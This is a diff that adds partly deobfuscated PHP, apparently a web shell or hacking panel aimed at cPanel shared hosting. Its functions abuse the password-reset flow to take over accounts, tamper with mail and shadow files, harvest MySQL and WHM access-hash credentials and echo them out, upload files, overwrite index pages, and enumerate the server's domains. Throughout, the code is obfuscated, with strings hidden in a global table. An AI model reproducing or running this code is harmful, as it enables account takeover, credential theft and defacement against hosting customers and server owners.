+            goto UecNW;
+        }
+        UecNW:
+        $a5nTe = DMqG6();
+        $hfN_Q = crypt($a5nTe, $GLOBALS[†][0x20]);
+        evlHO("/home{$kiUQn}{$MEejl}/etc");
+        eVlhO("/home{$kiUQn}{$MEejl}/etc/{$qQtqo}");
+        eVLho("/home{$kiUQn}{$MEejl}/mail");
+        eVlhO("/home{$kiUQn}{$MEejl}/mail/{$qQtqo}");
+        EVlho("/home{$kiUQn}{$MEejl}/mail/{$qQtqo}/{$e0Xsp}");
+        eVlho("/home{$kiUQn}{$MEejl}/mail/{$qQtqo}/{$e0Xsp}/.Archive");
+        eVLho("/home{$kiUQn}{$MEejl}/mail/{$qQtqo}/{$e0Xsp}/.Drafts");
+        EvLHo("/home{$kiUQn}{$MEejl}/mail/{$qQtqo}/{$e0Xsp}/.Sent");
+        EVLhO("/home{$kiUQn}{$MEejl}/mail/{$qQtqo}/{$e0Xsp}/.spam");
+        eVlhO("/home{$kiUQn}{$MEejl}/mail/{$qQtqo}/{$e0Xsp}/.Trash");
+        EvlHO("/home{$kiUQn}{$MEejl}/mail/{$qQtqo}/{$e0Xsp}/cur");
+        eVlHo("/home{$kiUQn}{$MEejl}/mail/{$qQtqo}/{$e0Xsp}/new");
+        EVlHo("/home{$kiUQn}{$MEejl}/mail/{$qQtqo}/{$e0Xsp}/tmp");
+        VoZK8("/home{$kiUQn}{$MEejl}/mail/{$qQtqo}/{$e0Xsp}/dovecot-acl-list", $GLOBALS[†][0x6]);
+        VoZK8("/home{$kiUQn}{$MEejl}/mail/{$qQtqo}/{$e0Xsp}/dovecot-uidlist", $GLOBALS[†][0x77]);
+        vOZK8("/home{$kiUQn}{$MEejl}/mail/{$qQtqo}/{$e0Xsp}/dovecot-uidvalidity", $GLOBALS[†][0x54]);
+        vOZK8("/home{$kiUQn}{$MEejl}/mail/{$qQtqo}/{$e0Xsp}/dovecot-uidvalidity.5e196afc", $GLOBALS[†][0x6]);
+        Vozk8("/home{$kiUQn}{$MEejl}/mail/{$qQtqo}/{$e0Xsp}/dovecot.index.log", $GLOBALS[†][0x6]);
+        VOzk8("/home{$kiUQn}{$MEejl}/mail/{$qQtqo}/{$e0Xsp}/dovecot.list.index.log", $GLOBALS[†][0x6]);
+        VOZk8("/home{$kiUQn}{$MEejl}/mail/{$qQtqo}/{$e0Xsp}/dovecot.mailbox.log", $GLOBALS[†][0x6]);
+        voZk8("/home{$kiUQn}{$MEejl}/mail/{$qQtqo}/{$e0Xsp}/maildirsize", $GLOBALS[†][0x78]);
+        VOzK8("/home{$kiUQn}{$MEejl}/mail/{$qQtqo}/{$e0Xsp}/subscriptions", $GLOBALS[†][0x55]);
+        $w_2k2 = $e0Xsp . $GLOBALS[†][0x26] . $hfN_Q . $GLOBALS[†][0x27] . $GLOBALS[†][0x1f];
+        if (!file_exists($dRhnb)) {
+            goto WUZKi;
+        }
+        $FryuD = $GLOBALS[†][0x6];
+        $kdbAk = B9Knm($dRhnb);
+        if (strstr($kdbAk, $qQtqo . $GLOBALS[†][0x58])) {
+            goto nwrne;
+        }
+        $FryuD .= $GLOBALS[†][0x52] . $qQtqo . $GLOBALS[†][0x53];
+        nwrne:
+        $FryuD .= $w_2k2;
+        $FryuD .= $kdbAk;
+        VozK8($dRhnb, $FryuD);
+        WUZKi:
+        if (file_exists($gOEvQ)) {
+            $FryuD = $GLOBALS[†][0x6];
+            $kdbAk = B9knm($gOEvQ);
+            if (strstr($kdbAk, $qQtqo . $GLOBALS[†][0x58])) {
+                goto Fm31k;
+            }
+            $FryuD .= $GLOBALS[†][0x52] . $qQtqo . $GLOBALS[†][0x53];
+            Fm31k:
+            $FryuD .= $w_2k2;
+            $FryuD .= $kdbAk;
+            vOZK8($gOEvQ, $FryuD);
+            goto ds7jZ;
+        }
+        $FryuD = $GLOBALS[†][0x6];
+        $kdbAk = $GLOBALS[†][0x6];
+        $FryuD .= $GLOBALS[†][0x52] . $qQtqo . $GLOBALS[†][0x53];
+        $FryuD .= $w_2k2;
+        vOzk8($gOEvQ, $FryuD);
+        ds7jZ:
+        $AnD4x = "{$e0Xsp}@{$qQtqo}|{$a5nTe}";
+        echo "<smtp><domain>Domian => {$qQtqo}</domain><port><br>Port => 587</port><smtpname><br>SMTPname => {$e0Xsp}</smtpname><password><br>Password => {$a5nTe}</password></smtp><br>\n";
+    }
+    function fiSuK($MEejl, $a5nTe)
+    {
+        global $KXVuX;
+        $QlnRV = array($GLOBALS[†][0x2] => $MEejl, $GLOBALS[†][0x7c] => $a5nTe, $GLOBALS[†][0x7d] => $GLOBALS[†][0x7e]);
+        $hJpjc = c2mjQ($KXVuX . $GLOBALS[†][0x7b], null, $QlnRV);
+        if (!(preg_match($GLOBALS[†][0x7f], $hJpjc) || preg_match($GLOBALS[†][0x80], $hJpjc) || preg_match($GLOBALS[†][0x81], $hJpjc))) {
+            return !1;
+        }
+        return !0;
+    }
+    function kRVgA()
+    {
+        global $qQtqo;
+        global $MEejl;
+        global $kiUQn;
+        if (!B9KnM("/home{$kiUQn}{$MEejl}/.my.cnf")) {
+            goto OVU_2;
+        }
+        $z9Bp1 = b9KnM("/home{$kiUQn}{$MEejl}/.my.cnf");
+        preg_match($GLOBALS[†][0x47], $z9Bp1, $hWXbw);
+        preg_match($GLOBALS[†][0x48], $z9Bp1, $glJ21);
+        if (!preg_match($GLOBALS[†][0x49], $z9Bp1)) {
+            goto Sx9k9;
+        }
+        if (!empty($hWXbw[0x1])) {
+            $FJ_u5 = $hWXbw[0x1];
+            goto gfWfc;
+        }
+        if (!empty($glJ21[0x1])) {
+            $FJ_u5 = $glJ21[0x1];
+            goto cS7hT;
+        }
+        cS7hT:
+        gfWfc:
+        if (!isset($FJ_u5)) {
+            goto w5PHq;
+        }
+        if (!(fiSuk($MEejl, $FJ_u5) == !0)) {
+            goto SMpCL;
+        }
+        echo "\n<br><cpanel>https://{$qQtqo}:2083|{$MEejl}|{$FJ_u5}</cpanel>";
+        SMpCL:
+        w5PHq:
+        Sx9k9:
+        OVU_2:
+    }
+    function VK01Q($CLaUX)
+    {
+        global $MEejl;
+        global $kiUQn;
+        global $KXVuX;
+        global $kdbAk;
+        Vozk8("/home{$kiUQn}{$MEejl}/.contactemail", $CLaUX);
+        vOzk8("/home{$kiUQn}{$MEejl}/.cpanel/contactinfo", $GLOBALS[†][0x163] . $CLaUX);
+        $CLBqi = array($GLOBALS[†][0x2] => $MEejl, $GLOBALS[†][0x161] => $GLOBALS[†][0x162]);
+        $hJpjc = c2mJq("{$KXVuX}/resetpass", null, $CLBqi);
+        if (!preg_match($GLOBALS[†][0x167], $hJpjc)) {
+            $w6xGW = array($GLOBALS[†][0x3] => $GLOBALS[†][0x168], $GLOBALS[†][0x2] => $MEejl, $GLOBALS[†][0x169] => $CLaUX, $GLOBALS[†][0x5] => $GLOBALS[†][0x6], $GLOBALS[†][0x16a] => $CLaUX, $GLOBALS[†][0x161] => $GLOBALS[†][0x16b]);
+            $nalM3 = C2mjQ("{$KXVuX}/resetpass", null, $w6xGW);
+            if (!preg_match($GLOBALS[†][0x160], $nalM3)) {
+                goto VktjB;
+            }
+            unlink("/home{$kiUQn}{$MEejl}/.contactemail");
+            unlink("/home{$kiUQn}{$MEejl}/.cpanel/contactinfo");
+            voZK8("/home{$kiUQn}{$MEejl}/.contactemail", $CLaUX);
+            chmod("/home{$kiUQn}{$MEejl}/.contactemail", 0600);
+            $nalM3 = c2MJq("{$KXVuX}/resetpass", null, $w6xGW);
+            VktjB:
+            if (!preg_match($GLOBALS[†][0x164], $nalM3)) {
+                if (!preg_match($GLOBALS[†][0x160], $nalM3)) {
+                    return !0;
+                }
+                return "Reset Password Vulnerability closed";
+            }
+            return "You exceeded the password reset request limit, Try again in one hour";
+        }
+        if (!isset($kdbAk)) {
+            goto oivTA;
+        }
+        aPU8W();
+        oivTA:
+        KRvGA();
+        die($GLOBALS[†][0x166]);
+    }
+    function cZmyo($FP0Gf)
+    {
+        global $AnD4x;
+        global $jRqUE;
+        sleep(0x7);
+        $MoqpY = 0;
+        $LgYxz = scandir($FP0Gf);
+        foreach ($LgYxz as $kok7g) {
+            if (!($kok7g != $GLOBALS[†][0x51] && $kok7g != $GLOBALS[†][0xa8] && $kok7g != $GLOBALS[†][0xa9])) {
+                goto xzlYm;
+            }
+            $MoqpY++;
+            $cXBYc = b9KNm($FP0Gf . $GLOBALS[†][0x33] . $kok7g);
+            if (!preg_match($GLOBALS[†][0xa4], $cXBYc, $NmhqC)) {
+                goto QK0av;
+            }
+            $WSwLN = $NmhqC[0x1];
+            QK0av:
+            xzlYm:
+        }
+        if (!(empty($WSwLN) && $MoqpY > 0)) {
+            goto Ih3BC;
+        }
+        $AnD4x = explode($GLOBALS[†][0xa5], $AnD4x);
+        $CLaUX = $AnD4x[0];
+        $a5nTe = $AnD4x[0x1];
+        $P1ZgT = array($GLOBALS[†][0x2] => $CLaUX, $GLOBALS[†][0x7c] => $a5nTe, $GLOBALS[†][0x7d] => $GLOBALS[†][0x7e]);
+        $l7qat = C2MjQ("{$jRqUE}/login/", null, $P1ZgT);
+        if (!preg_match($GLOBALS[†][0xa6], $l7qat)) {
+            goto ru4di;
+        }
+        if (preg_match($GLOBALS[†][0xad], $l7qat, $bjPig)) {
+            $bjPig = $bjPig[0x1];
+            goto EbWzk;
+        }
+        if (preg_match($GLOBALS[†][0xa3], $l7qat, $bjPig)) {
+            $bjPig = $bjPig[0x1];
+            goto EbWzk;
+        }
+        if (preg_match($GLOBALS[†][0xab], $l7qat, $bjPig)) {
+            $bjPig = $bjPig[0x1];
+            goto EbWzk;
+        }
+        if (preg_match($GLOBALS[†][0xae], $l7qat, $bjPig)) {
+            $bjPig = $bjPig[0x1];
+            goto EbWzk;
+        }
+        if (preg_match($GLOBALS[†][0xaf], $l7qat, $bjPig)) {
+            $bjPig = $bjPig[0x1];
+            goto EbWzk;
+        }
+        if (preg_match($GLOBALS[†][0xa2], $l7qat, $bjPig)) {
+            $bjPig = $bjPig[0x1];
+            goto EbWzk;
+        }
+        if (preg_match($GLOBALS[†][0xa7], $l7qat, $bjPig)) {
+            $bjPig = $bjPig[0x1];
+            EbWzk:
+            $EtLFd = C2MJq("{$jRqUE}/{$bjPig}/3rdparty/roundcube/");
+            sleep(0x1);
+            $PLKJH = 0x1;
+            LvHh_:
+            if (!($PLKJH <= 0x63)) {
+                goto LSE01;
+            }
+            $LWuWa = C2mjQ("{$jRqUE}/{$bjPig}/3rdparty/roundcube/?_uid=" . $PLKJH . $GLOBALS[†][0xac]);
+            if (!preg_match($GLOBALS[†][0xa4], $LWuWa, $OSbNb)) {
+                $PLKJH++;
+                goto LvHh_;
+            }
+            $WSwLN = $OSbNb[0x1];
+            LSE01:
+            ru4di:
+            Ih3BC:
+            if (!empty($WSwLN)) {
+                return $WSwLN;
+            }
+            KRvGa();
+            APU8w();
+            die($GLOBALS[†][0xaa]);
+        }
+        kRVgA();
+        Apu8W();
+        die($GLOBALS[†][0xaa]);
+    }
+    function ExDbO($FP0Gf = null)
+    {
+        global $MEejl;
+        global $qQtqo;
+        global $KXVuX;
+        if ($FP0Gf == null) {
+            $WSwLN = trim($_POST[$GLOBALS[†][0x1]]);
+            goto mgfFA;
+        }
+        $WSwLN = CZmyO($FP0Gf);
+        mgfFA:
+        $NIXWW = array($GLOBALS[†][0x2] => $MEejl, $GLOBALS[†][0x3] => $GLOBALS[†][0x4], $GLOBALS[†][0x5] => $GLOBALS[†][0x6], $GLOBALS[†][0x7] => $WSwLN);
+        $vm_Qx = c2mJQ("{$KXVuX}/resetpass", null, $NIXWW);
+        $lxpAJ = DMQg6();
+        $AiB6q = array($GLOBALS[†][0x3] => $GLOBALS[†][0x8], $GLOBALS[†][0x2] => $MEejl, $GLOBALS[†][0x8] => $lxpAJ, $GLOBALS[†][0x9] => $GLOBALS[†][0xa], $GLOBALS[†][0xb] => $GLOBALS[†][0xa], $GLOBALS[†][0x7] => $lxpAJ);
+        $dBV_E = C2Mjq("{$KXVuX}/resetpass", null, $AiB6q);
+        echo "<cpanel>https://{$qQtqo}:2083|{$MEejl}|{$lxpAJ}</cpanel><br>\n";
+    }
+    function vtqtx()
+    {
+        global $kiUQn;
+        global $MEejl;
+        global $qQtqo;
+        global $e0Xsp;
+        if (isset($_POST[$GLOBALS[†][0x4a]])) {
+            $jlkns = vK01q(trim($_POST[$GLOBALS[†][0x4a]]));
+            if (!($jlkns !== !0)) {
+                exit(0);
+            }
+            krVga();
+            APu8W();
+            die($GLOBALS[†][0x4b] . $jlkns . $GLOBALS[†][0x4c]);
+        }
+        if (isset($_POST[$GLOBALS[†][0x1]])) {
+            exDBO();
+            unlink("/home{$kiUQn}{$MEejl}/.contactemail");
+            unlink("/home{$kiUQn}{$MEejl}/.cpanel/contactinfo");
+            unlink($GLOBALS[†][0xf]);
+            exit(0);
+        }
+        XtdNN:
+        $jlkns = vK01Q("{$e0Xsp}@{$qQtqo}");
+        if (!($jlkns !== !0)) {
+            exDBo("/home{$kiUQn}{$MEejl}/mail/{$qQtqo}/{$e0Xsp}/new");
+            Apu8w();
+            // [PHPDeobfuscator] Implied return
+            return;
+        }
+        KRvGA();
+        aPu8W();
+        die($GLOBALS[†][0x4b] . $jlkns . $GLOBALS[†][0x4c]);
+    }
+    function aPU8W()
+    {
+        global $kdbAk;
+        global $kiUQn;
+        global $MEejl;
+        global $qQtqo;
+        global $e0Xsp;
+        $gOEvQ = "/home{$kiUQn}{$MEejl}/etc/{$qQtqo}/shadow";
+        $dRhnb = "/home{$kiUQn}{$MEejl}/etc/shadow";
+        VOzk8($gOEvQ, $kdbAk);
+        VOzk8($dRhnb, $kdbAk);
+        chmod($gOEvQ, 0640);
+        chmod($dRhnb, 0640);
+        unlink("/home{$kiUQn}{$MEejl}/.contactemail");
+        unlink("/home{$kiUQn}{$MEejl}/.cpanel/contactinfo");
+        PqW2f($GLOBALS[†][0xcb] . $kiUQn . $MEejl . "/mail/{$qQtqo}/{$e0Xsp}");
+        unlink($GLOBALS[†][0xcc]);
+    }
+    function lUBgU($e6Nda)
+    {
+        global $f3Y8l;
+        if (!isset($_POST[$GLOBALS[†][0x159]])) {
+            $xwe17 = $_FILES[$GLOBALS[†][0xb6]][$GLOBALS[†][0x14f]];
+            if ($e6Nda == 0x1) {
+                $C59S2 = $f3Y8l . $_FILES[$GLOBALS[†][0xb6]][$GLOBALS[†][0xc4]];
+                goto Y3m1J;
+            }
+            if ($e6Nda == 0x2) {
+                $oZNFs = substr(str_shuffle($GLOBALS[†][0x15d]), 0x2d);
+                EVlHO($oZNFs);
+                VOzK8($oZNFs . $GLOBALS[†][0x15b], $GLOBALS[†][0x15c]);
+                $C59S2 = $oZNFs . $GLOBALS[†][0x33] . $_FILES[$GLOBALS[†][0xb6]][$GLOBALS[†][0xc4]];
+                goto wMFQ7;
+            }
+            $C59S2 = $_FILES[$GLOBALS[†][0xb6]][$GLOBALS[†][0xc4]];
+            wMFQ7:
+            Y3m1J:
+            $pJ5jY = move_uploaded_file($xwe17, $C59S2);
+            if ($pJ5jY) {
+                goto qsSCt;
+            }
+            $pJ5jY = copy($xwe17, $C59S2);
+            qsSCt:
+            if (!$pJ5jY) {
+                goto BPRB9;
+            }
+            echo "<successfully>Uploaded successfully.</successfully>";
+            if (!($e6Nda == 0x2)) {
+                goto m3jcY;
+            }
+            echo "<br><folder>{$oZNFs}</folder>";
+            m3jcY:
+            BPRB9:
+            // [PHPDeobfuscator] Implied return
+            return;
+        }
+        rename(trim($_POST[$GLOBALS[†][0x159]]), trim($_POST[$GLOBALS[†][0x15a]]));
+        $Vn0qt = trim($_POST[$GLOBALS[†][0x15a]]);
+        $new_index = YmcUW($Vn0qt, "<?php");
+        chmod($Vn0qt, 0644);
+        vOZk8($Vn0qt, $new_index);
+        exit;
+    }
+    function pbAxf()
+    {
+        global $f3Y8l;
+        $ZuOPy = $_POST[$GLOBALS[†][0x9d]];
+        $YKxjh = 0;
+        $QG9Mz = array($f3Y8l . $GLOBALS[†][0x90], $f3Y8l . $GLOBALS[†][0xbb], $f3Y8l . $GLOBALS[†][0xbc]);
+        foreach ($QG9Mz as $JJGwp) {
+            if (!file_exists($JJGwp)) {
+                goto vU0BH;
+            }
+            $iy6u0 = VOZk8($JJGwp, $ZuOPy);
+            if ($iy6u0) {
+                goto iwjMf;
+            }
+            unlink($JJGwp);
+            vOzK8($JJGwp, $ZuOPy);
+            iwjMf:
+            $YKxjh = 0x1;
+            vU0BH:
+        }
+        if (!($YKxjh == 0)) {
+            goto TTuKe;
+        }
+        foreach ($QG9Mz as $JJGwp) {
+            VOzK8($JJGwp, $ZuOPy);
+        }
+        TTuKe:
+        echo "./Done";
+    }
+    function Dk9V6($MEejl, $nAKcI)
+    {
+        global $BAOWp;
+        $nAKcI = str_replace($GLOBALS[†][0x28], $GLOBALS[†][0x10d], $nAKcI);
+        $pAF2l = array("Authorization:WHM {$MEejl}:{$nAKcI}");
+        $hJpjc = c2mJq($BAOWp . $GLOBALS[†][0x151], $pAF2l, null);
+        if (!(preg_match($GLOBALS[†][0x152], $hJpjc) || preg_match($GLOBALS[†][0x153], $hJpjc))) {
+            return !1;
+        }
+        return !0;
+    }
+    function cXXfv()
+    {
+        global $MEejl;
+        global $kiUQn;
+        if (!B9kNM($GLOBALS[†][0x10e])) {
+            goto kmJKR;
+        }
+        $vaknf = B9knm($GLOBALS[†][0x10e]);
+        $vaknf = explode($GLOBALS[†][0x28], trim($vaknf));
+        foreach ($vaknf as $SZK0H) {
+            $cDMRg = explode($GLOBALS[†][0x21], $SZK0H);
+            $cDMRg = $cDMRg[0];
+            if (!b9knM("/home{$kiUQn}{$cDMRg}/.accesshash")) {
+                goto N1mYh;
+            }
+            $nAKcI = B9knM("/home{$kiUQn}{$cDMRg}/.accesshash");
+            $nAKcI = str_replace($GLOBALS[†][0x28], $GLOBALS[†][0x10d], $nAKcI);
+            if (!(dK9V6($cDMRg, $nAKcI) == !0)) {
+                goto ZC8iH;
+            }
+            echo "<font color=\"green\"><center>[+] Accesshash </center> </font><br>\\n";
+            ZC8iH:
+            N1mYh:
+        }
+        kmJKR:
+        if (b9KnM("/home{$kiUQn}{$MEejl}/.accesshash")) {
+            $nAKcI = B9knm("/home{$kiUQn}{$MEejl}/.accesshash");
+            $nAKcI = str_replace($GLOBALS[†][0x28], $GLOBALS[†][0x10d], $nAKcI);
+            if (!(DK9v6($MEejl, $nAKcI) == !0)) {
+                goto A8ujk;
+            }
+            echo "<font color=\"green\"><center>[+] Accesshash </center> </font><br>\\n";
+            A8ujk:
+            goto VSXRu;
+        }
+        unlink("/home{$kiUQn}{$MEejl}/.accesshash");
+        $BUcf_ = substr(str_shuffle($GLOBALS[†][0x56]), 0x3);
+        voZk8("/home{$kiUQn}{$MEejl}/.accesshash", $BUcf_);
+        chmod("/home{$kiUQn}{$MEejl}/.accesshash", 0600);
+        if (DK9v6($MEejl, $nAKcI) == !0) {
+            echo "<font color=\"green\"><center>[+] Accesshash </center> </font><br>\\n";
+            goto WGo73;
+        }
+        unlink("/home{$kiUQn}{$MEejl}/.accesshash");
+        WGo73:
+        VSXRu:
+    }
+    function XOkfG()
+    {
+        global $MEejl;
+        global $kiUQn;
+        if (b9KNM($GLOBALS[†][0x170])) {
+            $zTaiG = b9kNm($GLOBALS[†][0x170]);
+            $zTaiG = explode($GLOBALS[†][0x28], trim($zTaiG));
+            foreach ($zTaiG as $SZK0H) {
+                $cDMRg = explode($GLOBALS[†][0x21], $SZK0H);
+                $cDMRg = $cDMRg[0];
+                if (!B9KNM("/home{$kiUQn}{$cDMRg}/.my.cnf")) {
+                    goto gco53;
+                }
+                echo "<font color=\"green\"><center>[+] mycnf </center> </font><br>";
+                gco53:
+            }
+            goto fk2of;
+        }
+        if (B9kNm("/home{$kiUQn}{$MEejl}/.my.cnf")) {
+            echo "<font color=\"green\"><center>[+] mycnf </center> </font><br>";
+            goto mHiss;
+        }
+        mHiss:
+        fk2of:
+    }
+    function Eloyb()
+    {
+        global $P0a6M;
+        $Y44ek = $GLOBALS[†][0xd0] . $P0a6M;
+        $GTTft = Xk7mM($Y44ek);
+        $glTbz = json_decode($GTTft)->{$GLOBALS[†][0xd1]};
+        $yTq9n = json_decode($GTTft)->{$GLOBALS[†][0xd2]};
+        return array($glTbz, $yTq9n);
+    }
+    function R37fy($e6Nda)
+    {
+        global $P0a6M;
+        $d_GG4 = array();
+        $Zsuvb = xk7Mm($GLOBALS[†][0x1b0] . $P0a6M . $GLOBALS[†][0x1b1]);
+        if (!preg_match_all($GLOBALS[†][0x1b2], $Zsuvb, $bFQZz)) {
+            goto wSimb;
+        }
+        foreach ($bFQZz[0x1] as $d7nFp) {
+            $d_GG4[] = $d7nFp;
+            if (!($e6Nda == 0x1)) {
+                goto uAMoW;
+            }
+            echo "{$d7nFp}\n";
+            uAMoW:
+        }
+        wSimb:
+        return $d_GG4;
+    }
+    function NsrXc($e6Nda)
+    {
+        global $hfN_Q;
+        global $qQtqo;
+        global $kiUQn;
+        global $MEejl;
+        global $P0a6M;
+        echo "<ip>{$P0a6M}</ip>";
+        if (preg_match("/www\\.{$qQtqo}/", $hfN_Q)) {
+            $LCKeC = $GLOBALS[†][0x79] . $qQtqo;
+            goto aFtyO;
+        }
+        $LCKeC = $qQtqo;
+        aFtyO:
+        $d_GG4 = array();
+        $q4E6r = B9Knm($GLOBALS[†][0xc3]);
+        if ($q4E6r) {
+            preg_match_all($GLOBALS[†][0xc7], $q4E6r, $MWi1Y);
+            $bFQZz = array_unique($MWi1Y[0x1]);
+            foreach ($bFQZz as $d7nFp) {
+                $d_GG4[] = $d7nFp;
+                if (!($e6Nda == 0x1)) {
+                    goto YkZrW;
+                }
+                echo "{$d7nFp}\n";
+                YkZrW:
+            }
+            goto FvrBZ;
+        }
+        if (preg_match("/\\/{$LCKeC}/", $hfN_Q) && !is_dir("/home{$kiUQn}{$MEejl}/.cpanel")) {
+            preg_match("#/(.*)\\/{$LCKeC}/#", $hfN_Q, $e6nBH);
+            $e6nBH = $GLOBALS[†][0x33] . $e6nBH[0x1];
+            $bFQZz = RX2IN("ls {$e6nBH} | grep '\\.'");
+            if ($bFQZz) {
+                $XJTbu = explode($GLOBALS[†][0x28], $bFQZz);
+                if (!is_array($XJTbu)) {
+                    goto jXuHB;
+                }
+                foreach ($XJTbu as $d7nFp) {
+                    if (!is_file($e6nBH . $GLOBALS[†][0x33] . $d7nFp)) {
+                        $d_GG4[] = $d7nFp;
+                        if (!($e6Nda == 0x1)) {
+                            goto t0wzr;
+                        }
+                        echo "{$d7nFp}\n";
+                        t0wzr:
+                        goto ZzauG;
+                    }
+                    ZzauG:
+                }
+                jXuHB:
+                goto AU8u5;
+            }
+            $d_GG4 = scandir($e6nBH);
+            if (!is_array($d_GG4)) {
+                goto AaSPK;
+            }
+            foreach ($d_GG4 as $d7nFp) {
+                if (!(is_file($e6nBH . $GLOBALS[†][0x33] . $d7nFp) || !preg_match($GLOBALS[†][0xed], $d7nFp))) {
+                    $d_GG4[] = $d7nFp;
+                    if (!($e6Nda == 0x1)) {
+                        goto lyW5Z;
+                    }
+                    echo "{$d7nFp}\n";
+                    lyW5Z:
+                    goto Acpqh;
+                }
+                Acpqh:
+            }
+            AaSPK:
+            AU8u5:
+            goto FvrBZ;
+        }
+        if (preg_match($GLOBALS[†][0xee], $hfN_Q, $AaHHs)) {
+            $e6nBH = $AaHHs[0x1] . $GLOBALS[†][0xec];
+            $yqAkR = rX2IN("ls {$e6nBH} | grep '\\.'");
+            $Jvgl7 = Rx2In($GLOBALS[†][0xef] . $e6nBH . $GLOBALS[†][0xf0]);
+            $bFQZz = $yqAkR . $GLOBALS[†][0x28] . $Jvgl7;
+            if (!preg_match($GLOBALS[†][0xed], $bFQZz)) {
+                goto Qe6Ca;
+            }
+            $XJTbu = explode($GLOBALS[†][0x28], $bFQZz);
+            if (!is_array($XJTbu)) {
+                goto w1ZDQ;
+            }
+            foreach ($XJTbu as $d7nFp) {
+                if (preg_match($GLOBALS[†][0xed], $d7nFp)) {
+                    $d_GG4[] = $d7nFp;
+                    if (!($e6Nda == 0x1)) {
+                        goto NgtHE;
+                    }
+                    echo "{$d7nFp}\n";
+                    NgtHE:
+                    goto RI3mi;
+                }
+                RI3mi:
+            }
+            w1ZDQ:
+            Qe6Ca:
+            goto gwA_g;
+        }
+        gwA_g:
+        FvrBZ:
+        if (!(!$d_GG4 && $e6Nda == 0x1)) {
+            goto bC_6a;
+        }
+        $d_GG4 = r37fy();
+        bC_6a:
+        if ($d_GG4) {
+            goto caViV;
+        }
+        echo "<error>can't get domains.</error>";
+        caViV:
+        return count($d_GG4);
+    }
+    function KUTN3()
+    {
+        global $ahSaQ;
+        global $hfN_Q;
+        global $kiUQn;
+        global $MEejl;
+        global $qQtqo;
+        global $P0a6M;
+        $jn3Y1 = eLOYB();
+        echo $GLOBALS[†][0x107] . phpversion() . $GLOBALS[†][0x108];
+        echo $GLOBALS[†][0x103] . $qQtqo . $GLOBALS[†][0x104];
+        echo $GLOBALS[†][0xfc] . $P0a6M . $GLOBALS[†][0xfd];
+        echo $GLOBALS[†][0x100] . $ahSaQ . $GLOBALS[†][0x101];
+        echo $GLOBALS[†][0x109] . $hfN_Q . $GLOBALS[†][0x10a];
+        echo $GLOBALS[†][0xfe] . $jn3Y1[0] . $GLOBALS[†][0xff];
+        echo $GLOBALS[†][0x105] . $jn3Y1[0x1] . $GLOBALS[†][0x106];
+        echo $GLOBALS[†][0xf5] . nsRxc(0) . $GLOBALS[†][0xf6];
+        if (preg_match($GLOBALS[†][0xfa], $ahSaQ)) {
+            echo "<server><font color=\"red\"><center>[-] Windows</center> </font><br></server>";
+            goto YXGqa;
+        }
+        echo "<server><font color=\"green\"><center>[+] Linux</center> </font><br></server>";
+        YXGqa:
+        if (is_dir("/home{$kiUQn}{$MEejl}/.cpanel")) {
+            echo "<cp><font color=\"green\"><center>[+] cPanel</center> </font><br></cp>";
+            goto cs_45;
+        }
+        if (preg_match($GLOBALS[†][0xfb], $hfN_Q)) {
+            echo "<cp><font color=\"green\"><center>[+] vHosts</center> </font><br></cp>";
+            goto f3Yqa;
+        }
+        echo "<cp><font color=\"red\"><center>[-] There is no cPanel or vHosts.</center> </font><br></cp>";
+        f3Yqa:
+        cs_45:
+    }
+    function cP_L4($FyUUQ)
+    {
+        $dc09_ = array($GLOBALS[†][0x35] => $GLOBALS[†][0x36], $GLOBALS[†][0x37] => $GLOBALS[†][0x38], $GLOBALS[†][0x36] => $GLOBALS[†][0x39], $GLOBALS[†][0x3a] => $GLOBALS[†][0x3b], $GLOBALS[†][0x3c] => $GLOBALS[†][0x3d], $GLOBALS[†][0x3e] => $GLOBALS[†][0x3f], $GLOBALS[†][0x40] => $GLOBALS[†][0x41], $GLOBALS[†][0x38] => $GLOBALS[†][0x42], $GLOBALS[†][0x3b] => $GLOBALS[†][0x43], $GLOBALS[†][0x44] => $GLOBALS[†][0x3e], $GLOBALS[†][0x39] => $GLOBALS[†][0x3c], $GLOBALS[†][0x42] => $GLOBALS[†][0x37], $GLOBALS[†][0x45] => $GLOBALS[†][0x3a], $GLOBALS[†][0x3f] => $GLOBALS[†][0x44], $GLOBALS[†][0x3d] => $GLOBALS[†][0x45], $GLOBALS[†][0x41] => $GLOBALS[†][0x35], $GLOBALS[†][0x43] => $GLOBALS[†][0x40]);
+        $lJgHS = str_split($FyUUQ);
+        $fcc1J = $GLOBALS[†][0x6];
+        foreach ($lJgHS as $bB6uL) {
+            if (in_array($bB6uL, $dc09_)) {
+                $fcc1J .= $dc09_[$bB6uL];
+                goto ICp09;
+            }
+            $fcc1J .= $bB6uL;
+            ICp09:
+        }
+        return $fcc1J;
+    }
+    function R8EWQ()
+    {
+        $UYwdW = 0;
+        $iWl9a = 0;
+        $a5oB5 = 0;
+        $WzpHl = 0;
+        $d_zdK = 0;
+        $oxwYf = 0;
+        $aCb7p = trim($_POST[$GLOBALS[†][0x17c]]);
+        $i0IQ9 = XK7Mm($aCb7p);
+        if (!preg_match($GLOBALS[†][0x17a], $i0IQ9)) {
+            goto eYu45;
+        }
+        preg_match_all($GLOBALS[†][0x17b], $i0IQ9, $jGyN8);
+        foreach ($jGyN8[0x1] as $Zwfu5) {
+            $a5oB5++;
+        }
+        if (!($a5oB5 > 0x190)) {
+            eYu45:
+            preg_match_all($GLOBALS[†][0x17d], $i0IQ9, $nY2Eh);
+            if (preg_match($GLOBALS[†][0x180], $aCb7p)) {
+                $jYM3q = str_replace($GLOBALS[†][0xa1], $GLOBALS[†][0x10d], $aCb7p);
+                goto qw5va;
+            }
+            $jYM3q = str_replace($GLOBALS[†][0x178], $GLOBALS[†][0x10d], $aCb7p);
+            qw5va:
+            $jYM3q = substr($jYM3q, 0, strpos($jYM3q, $GLOBALS[†][0x33]));
+            foreach ($nY2Eh[0x1] as $oF5bx) {
+                $UYwdW++;
+                if (preg_match($GLOBALS[†][0x1a2], $oF5bx) || preg_match($GLOBALS[†][0x180], $oF5bx)) {
+                    $Y44ek = $oF5bx . $GLOBALS[†][0x14d];
+                    goto B7ut9;
+                }
+                if (preg_match($GLOBALS[†][0x193], $oF5bx)) {
+                    $Y44ek = $GLOBALS[†][0xe3] . $jYM3q . $oF5bx . $GLOBALS[†][0x14d];
+                    goto KEZZq;
+                }
+                $Y44ek = $aCb7p . $oF5bx . $GLOBALS[†][0x14d];
+                KEZZq:
+                B7ut9:
+                $wM4as = htmlspecialchars_decode(Xk7mm($Y44ek));
+                preg_match($GLOBALS[†][0x188], $wM4as, $hWXbw);
+                preg_match($GLOBALS[†][0x1ac], $wM4as, $glJ21);
+                preg_match($GLOBALS[†][0x198], $wM4as, $nc4lE);
